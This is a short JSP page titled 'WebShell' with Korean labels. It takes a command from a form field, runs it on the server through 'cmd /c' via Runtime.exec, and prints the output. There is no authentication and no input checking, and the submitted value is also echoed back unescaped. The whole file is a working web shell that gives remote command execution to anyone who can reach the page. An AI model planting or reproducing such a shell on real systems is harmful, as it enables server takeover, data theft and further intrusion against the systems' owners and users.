<%@ page contentType="text/html;charset=UTF-8"%>
<%@ page import="java.io.*"%>
<%
	String execute = request.getParameter("execute");
	if (execute == null)
		execute = "";
%>
<html>
<head>
<title>WebShell</title>
<script>
	function send() {
		document.main.submit();
	}
</script>

</head>
<body>
	<br>
	<form method="post" name="main" action="webshell.jsp">
		<table style="width:400px" border="1" >
			<tr bgcolor="#F7FCFE">
				<td height="22" align="center" width="70">명령어</td>
				<td height="22" align="center" align="left"><input type="text"
					name="execute" size="30" value="<%=execute%>"> <input
					type="button" value="실행" onClick="javascript:send();"></td>
			</tr>
		</table>
	</form>
	<hr>
	<%
		if (!execute.equals("")) {
			BufferedReader br = null;
			Runtime rt = Runtime.getRuntime();
			Process proc = rt.exec("cmd /c "+execute);
			br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			String line;
			while ((line = br.readLine()) != null) {
				out.println(line + "<br>");
			}
			br.close();
			proc.destroy();
		}
	%>
</body>
</html>